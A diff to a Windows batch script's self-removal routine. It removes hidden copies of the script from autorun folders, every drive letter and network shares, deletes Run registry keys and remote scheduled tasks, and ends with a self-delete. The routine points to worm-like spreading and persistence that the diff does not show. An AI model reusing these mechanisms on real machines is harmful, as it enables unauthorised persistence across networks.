@@ -199,14 +199,21 @@ goto :cycle
 
 
 :selfRemover
-if exist "%path_autoRun1%\%~nx0" del /q "%path_autoRun1%\%~nx0"
-if exist "%path_autoRun2%\%~nx0" del /q "%path_autoRun2%\%~nx0"
+if exist "%path_autoRun1%\%~nx0" (
+  attrib -h -r -s "%path_autoRun1%\%~nx0"
+  del /q "%path_autoRun1%\%~nx0"
+)
+if exist "%path_autoRun2%\%~nx0" (
+  attrib -h -r -s "%path_autoRun2%\%~nx0"
+  del /q "%path_autoRun2%\%~nx0"
+)
 
 
 
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
+      attrib -h -r -s "%%i:\%~nx0"
       del /q "%%i:\%~nx0"
       (
         reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
@@ -233,6 +240,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
     if exist "%%i\%%j\%~nx0" (
+      attrib -h -r -s "%%i\%%j\%~nx0"
       del /q "%%i\%%j\%~nx0"
       (for /f "delims=\" %%z in ("%%i") do schtasks /delete /s %%z /tn "%app_name% %%j" /f)>nul 2>nul
 
@@ -248,5 +256,5 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
   )
 )
 
-start "" cmd /c "timeout /t 3 ^& del /q """%~dpnx0""""
+start "" cmd /c "timeout /t 3 && del /q ^"%~dpnx0^""
 exit
